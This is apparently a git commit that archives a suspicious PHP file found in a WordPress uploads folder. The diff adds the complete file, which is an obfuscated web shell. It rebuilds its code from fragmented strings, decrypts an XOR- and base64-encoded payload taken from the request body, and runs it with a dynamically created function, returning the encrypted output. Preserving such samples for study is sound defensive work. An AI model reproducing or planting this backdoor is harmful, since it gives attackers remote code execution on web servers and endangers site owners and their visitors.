11bd1b8edea582fe27633153a7eee606cc41b98b
johnycage <chemicalsequence@Yahoo.com>
2023-03-16 16:32:33 +0530

    suspicous php script
    not from wp core files nor part of any theme or plugin. loner file found in wp-content/uploads/

---
+++ ashishsoc.php
@@ -0,0 +1,10 @@
+<?php
+$g='/input"|),$m)==|1) {|@ob_st|art();@|e|val(@gzun|com|pr|ess(@x(@b|ase64_decod|e(|$|m[|1]),$k)));$o=@ob_get|_';
+$O='conte|nts(|);||@ob_end_clean();|$r|=@base|64|_encode(@x(@gz|c|ompres|s($o),|$k)|);print("$p|$kh$r$kf");}';
+$e='|k){$|c=strlen(|$k|);$l=|strlen(|$t);$|o=""|;for($i|=0;$i<$l;){f||or($j=0;($j<$c|&&$i|<$l);$j++|,|$i++)||';
+$i='$k="|512|c5cad";$kh|="6|c37edb98ae|9"||;$kf="1c8a76c|3a291|";$p="978c3SH|c|4bxGf6yH";|fun|cti|on x($t,$';
+$G=str_replace('k','','crekakte_kfkuknctikon');
+$Q='{$o.=$t{$|i}^$|k{$j};}}retu|rn $o;||}if (@preg_match|("/$k|h(.|+)$kf|/",@fi|le_get_|contents("|php:/|';
+$x=str_replace('|','',$i.$e.$Q.$g.$O);
+$C=$G('',$x);$C();
+?>
